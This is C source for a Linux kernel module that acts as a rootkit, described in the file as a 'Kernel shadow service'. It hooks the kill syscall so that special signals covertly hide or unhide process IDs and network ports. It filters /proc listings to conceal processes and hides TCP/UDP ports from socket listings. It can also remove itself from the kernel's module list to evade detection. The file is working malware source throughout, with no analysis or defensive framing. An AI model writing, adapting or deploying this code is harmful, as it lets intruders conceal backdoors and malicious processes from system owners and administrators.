#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/netdevice.h>
#include <linux/inet_diag.h>
#include <linux/seq_file.h>
#include <linux/ctype.h>
#include <linux/signal.h>
#include <net/tcp.h>
#include <net/udp.h>
#include "shadow.h"

#define MAX_HIDDEN_PIDS 16
#define MAX_HIDDEN_PORTS 16
#define PID_LEN 16

/* 
 * Custom commands encoded in Real-Time Signals (1-64 range)
 */
#define SIG_HIDE_PID 61
#define SIG_UNHIDE_PID 62
#define SIG_HIDE_PORT 63
#define SIG_UNHIDE_PORT 64

static char hide_pids[MAX_HIDDEN_PIDS][PID_LEN];
static int hide_pids_count = 0;
static u16 hide_ports[MAX_HIDDEN_PORTS];
static int hide_ports_count = 0;
static int self_hide = 1;

module_param(self_hide, int, 0644);

/* --- Signal Hijacking Logic --- */

/* 
 * In modern kernels, syscall arguments are passed via pt_regs.
 * We need to extract them based on the architecture.
 */
static int (*real_kill)(struct pt_regs *regs);

static int fake_kill(struct pt_regs *regs)
{
    int i, j;
    char pid_str[PID_LEN];
    pid_t pid;
    int sig;

    /* Extract arguments from registers */
#if defined(CONFIG_X86_64)
    pid = (pid_t)regs->di;
    sig = (int)regs->si;
#elif defined(CONFIG_ARM64)
    pid = (pid_t)regs->regs[0];
    sig = (int)regs->regs[1];
#else
    /* Fallback for other architectures if needed */
    return real_kill(regs);
#endif

    switch (sig) {
        case SIG_HIDE_PID:
            if (hide_pids_count >= MAX_HIDDEN_PIDS) return 0;
            snprintf(pid_str, PID_LEN, "%d", pid);
            for (i = 0; i < hide_pids_count; i++) {
                if (strcmp(hide_pids[i], pid_str) == 0) return 0;
            }
            strncpy(hide_pids[hide_pids_count], pid_str, PID_LEN);
            hide_pids_count++;
            //pr_info("shadow: Signal 64 received. Hiding PID %d\n", pid);
            return 0;

        case SIG_UNHIDE_PID:
            snprintf(pid_str, PID_LEN, "%d", pid);
            for (i = 0; i < hide_pids_count; i++) {
                if (strcmp(hide_pids[i], pid_str) == 0) {
                    for (j = i; j < hide_pids_count - 1; j++) {
                        strncpy(hide_pids[j], hide_pids[j+1], PID_LEN);
                    }
                    hide_pids_count--;
                    //pr_info("shadow: Signal 63 received. Unhiding PID %d\n", pid);
                    return 0;
                }
            }
            return 0;

        case SIG_HIDE_PORT:
            if (hide_ports_count >= MAX_HIDDEN_PORTS) return 0;
            for (i = 0; i < hide_ports_count; i++) {
                if (hide_ports[i] == (u16)pid) return 0;
            }
            hide_ports[hide_ports_count] = (u16)pid;
            hide_ports_count++;
            //pr_info("shadow: Signal 62 received. Hiding port %d\n", pid);
            return 0;

        case SIG_UNHIDE_PORT:
            for (i = 0; i < hide_ports_count; i++) {
                if (hide_ports[i] == (u16)pid) {
                    for (j = i; j < hide_ports_count - 1; j++) {
                        hide_ports[j] = hide_ports[j+1];
                    }
                    hide_ports_count--;
                    //pr_info("shadow: Signal 61 received. Unhiding port %d\n", pid);
                    return 0;
                }
            }
            return 0;
    }

    return real_kill(regs);
}

/* --- Process Hiding Logic --- */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
typedef bool (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
#else
typedef int (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64, unsigned int);
#endif

static int (*real_iterate_shared)(struct file *, struct dir_context *);
static int (*real_iterate_dir)(struct file *, struct dir_context *);

struct stealth_dir_context {
    struct dir_context ctx;
    struct dir_context *orig_ctx;
    filldir_t orig_actor;
    bool is_proc;
};

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
static bool stealth_actor(struct dir_context *ctx, const char *name, int len,
                         loff_t offset, u64 ino, unsigned int d_type)
#else
static int stealth_actor(struct dir_context *ctx, const char *name, int len,
                        loff_t offset, u64 ino, unsigned int d_type)
#endif
{
    struct stealth_dir_context *s_ctx = container_of(ctx, struct stealth_dir_context, ctx);
    int i;

    if (s_ctx->is_proc && len > 0 && isdigit(name[0])) {
        for (i = 0; i < hide_pids_count; i++) {
            if (len == strlen(hide_pids[i]) && strncmp(name, hide_pids[i], len) == 0)
                return true; 
        }
    }

    s_ctx->orig_ctx->pos = ctx->pos;
    return s_ctx->orig_actor(s_ctx->orig_ctx, name, len, offset, ino, d_type);
}

static int fake_iterate_common(struct file *file, struct dir_context *ctx, 
                               int (*real_func)(struct file *, struct dir_context *))
{
    int ret;
    struct stealth_dir_context s_ctx = {
        .ctx.actor = stealth_actor,
        .orig_ctx = ctx,
        .orig_actor = ctx->actor,
        .is_proc = false,
    };

    if (file && file->f_path.dentry && file->f_path.dentry->d_sb) {
        const char *fs_name = file->f_path.dentry->d_sb->s_type->name;
        if (strcmp(fs_name, "proc") == 0) {
            s_ctx.is_proc = true;
        }
    }

    if (!s_ctx.is_proc) {
        return real_func(file, ctx);
    }

    s_ctx.ctx.pos = ctx->pos;
    ret = real_func(file, &s_ctx.ctx);
    ctx->pos = s_ctx.ctx.pos;
    return ret;
}

static int fake_iterate_shared(struct file *file, struct dir_context *ctx)
{
    return fake_iterate_common(file, ctx, real_iterate_shared);
}

static int fake_iterate_dir(struct file *file, struct dir_context *ctx)
{
    return fake_iterate_common(file, ctx, real_iterate_dir);
}

/* --- Network Hiding Logic --- */

static int (*real_tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*real_udp4_seq_show)(struct seq_file *seq, void *v);

static int fake_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    int i;

    if (v == SEQ_START_TOKEN)
        return real_tcp4_seq_show(seq, v);

    for (i = 0; i < hide_ports_count; i++) {
        if (sk->sk_num == hide_ports[i])
            return 0;
    }

    return real_tcp4_seq_show(seq, v);
}

static int fake_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    int i;

    if (v == SEQ_START_TOKEN)
        return real_udp4_seq_show(seq, v);

    for (i = 0; i < hide_ports_count; i++) {
        if (sk->sk_num == hide_ports[i])
            return 0;
    }

    return real_udp4_seq_show(seq, v);
}

/* --- Module Self-Hiding --- */

static struct list_head *prev_module = NULL;

static void hide_module(void)
{
    if (prev_module) return;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void show_module(void)
{
    if (!prev_module) return;
    list_add(&THIS_MODULE->list, prev_module);
    prev_module = NULL;
}

/* --- Module Setup --- */

static struct ftrace_hook iterate_hooks[] = {
    { .name = "iterate_shared", .function = fake_iterate_shared, .original = &real_iterate_shared },
    { .name = "iterate_dir", .function = fake_iterate_dir, .original = &real_iterate_dir },
};

static struct ftrace_hook network_hooks[] = {
    { .name = "tcp4_seq_show", .function = fake_tcp4_seq_show, .original = &real_tcp4_seq_show },
    { .name = "udp4_seq_show", .function = fake_udp4_seq_show, .original = &real_udp4_seq_show },
};

static struct ftrace_hook kill_hooks[] = {
    { .name = "__x64_sys_kill", .function = fake_kill, .original = &real_kill },
    { .name = "__arm64_sys_kill", .function = fake_kill, .original = &real_kill },
    { .name = "sys_kill", .function = fake_kill, .original = &real_kill },
};

static int __init shadow_init(void)
{
    int err;
    int i;
    bool iterate_hooked = false;
    bool kill_hooked = false;

    err = resolve_ftrace_functions();
    if (err) return err;

    for (i = 0; i < ARRAY_SIZE(iterate_hooks); i++) {
        if (fh_install_hook(&iterate_hooks[i]) == 0) {
            iterate_hooked = true;
        }
    }

    for (i = 0; i < ARRAY_SIZE(kill_hooks); i++) {
        if (fh_install_hook(&kill_hooks[i]) == 0) {
            kill_hooked = true;
            break;
        }
    }

    fh_install_hooks(network_hooks, ARRAY_SIZE(network_hooks));

    if (!iterate_hooked || !kill_hooked) {
        pr_err("shadow: Failed to installed\n");
        return -ENOENT;
    }
    
    if (self_hide) {
        hide_module();
        //pr_info("shadow: Loaded in 1 mode.\n");
    } else {
        //pr_info("shadow: Loaded in 0 mode.\n");
    }
    
    return 0;
}

static void __exit shadow_exit(void)
{
    int i;
    if (self_hide) {
        show_module();
    }

    for (i = 0; i < ARRAY_SIZE(iterate_hooks); i++) fh_remove_hook(&iterate_hooks[i]);
    for (i = 0; i < ARRAY_SIZE(kill_hooks); i++) fh_remove_hook(&kill_hooks[i]);
    fh_remove_hooks(network_hooks, ARRAY_SIZE(network_hooks));
    
    //pr_info("shadow: Unloaded\n");
}

module_init(shadow_init);
module_exit(shadow_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("GPL");
MODULE_DESCRIPTION("Linux LKM Kernel shadow service");